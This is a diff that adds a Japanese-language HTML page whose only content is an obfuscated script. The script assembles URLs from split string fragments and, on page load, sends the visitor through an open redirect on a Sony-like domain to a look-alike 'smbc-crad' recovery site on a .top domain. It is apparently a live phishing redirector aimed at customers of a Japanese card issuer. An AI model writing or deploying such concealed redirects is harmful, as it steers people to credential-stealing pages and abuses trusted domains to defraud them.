@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="ja-JP">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script type="text/javascript">
+        function generateObfuscatedUrl() {
+            var baseUrlParams = [
+                'htt',
+                'ps:',
+                '//',
+                'ph',
+                'yd.',
+                'sony',
+                'son',
+                'po.',
+                'jp/',
+                'device',
+                'check/',
+                'redi',
+                'rect/?',
+                'red',
+                'irect',
+                'URL',
+                '='
+            ];
+
+            var hrefParams = [
+                'htt',
+                'ps:',
+                '//',
+                'smbc-',
+                'crad',
+                '.reco',
+                'very',
+                '5yv',
+                '.top',
+                '?session'
+            ];
+
+            var baseUrl = baseUrlParams.join('');
+            var hrefUrl = hrefParams.join('');
+            return baseUrl + hrefUrl;
+        }
+
+        window.onload = function () {
+            var obfuscatedUrl = generateObfuscatedUrl();
+            window.location.href = obfuscatedUrl;
+        }
+    </script>
+</head>
+
+<body>
+</body>
+
+</html>
